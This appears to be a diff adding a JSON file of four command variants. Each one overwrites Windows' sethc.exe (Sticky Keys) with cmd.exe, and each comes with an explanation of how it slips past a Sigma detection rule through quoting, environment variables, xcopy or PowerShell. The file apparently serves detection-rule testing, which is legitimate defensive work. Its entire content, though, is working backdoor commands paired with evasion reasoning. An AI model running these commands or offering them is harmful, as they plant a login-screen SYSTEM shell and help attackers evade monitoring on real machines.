@@ -1,0 +1,18 @@
+[
+  {
+    "output": "copy /y \"C:\\windows\\system32\\cmd.exe\" \"C:\\windows\\system32\\sethc.exe\"",
+    "explanation": "Bypasses the strict string match by adding quotation marks around the file paths. The Sigma rule expects an exact unquoted string with a single space between the paths."
+  },
+  {
+    "output": "copy /y %systemroot%\\system32\\cmd.exe %systemroot%\\system32\\sethc.exe",
+    "explanation": "Bypasses the hardcoded 'C:\\windows' path requirement by utilizing the %systemroot% (or %windir%) environment variable."
+  },
+  {
+    "output": "xcopy /y C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe",
+    "explanation": "Bypasses the rule by using the 'xcopy' utility instead of 'copy'. The rule specifically looks for the 'copy ' string."
+  },
+  {
+    "output": "powershell.exe -Command \"Copy-Item -Path C:\\windows\\system32\\cmd.exe -Destination C:\\windows\\system32\\sethc.exe -Force\"",
+    "explanation": "Bypasses the rule entirely by using PowerShell's Copy-Item cmdlet to perform the file replacement instead of the traditional DOS copy command."
+  }
+]
